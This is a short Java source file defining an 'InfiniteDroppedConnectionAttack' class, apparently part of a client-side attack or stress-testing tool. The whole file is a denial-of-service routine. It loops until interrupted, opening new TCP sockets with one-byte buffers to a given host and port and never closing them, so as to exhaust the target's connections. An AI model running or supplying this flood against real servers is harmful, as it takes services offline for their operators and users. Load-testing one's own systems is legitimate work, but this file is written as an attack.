package client;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

public class InfiniteDroppedConnectionAttack extends BaseAttack
{
	public InfiniteDroppedConnectionAttack(String host, int port)
	{
		super(host, port);
	}
	
	@SuppressWarnings("resource")
	@Override
	public void execute() throws IOException
	{
		while(!Thread.interrupted())
		{
			Socket s = new Socket();
			s.setTcpNoDelay(true);
			s.setReceiveBufferSize(1);
			s.setSendBufferSize(1);
			s.connect(InetSocketAddress.createUnresolved(host, port));
		}
	}
}
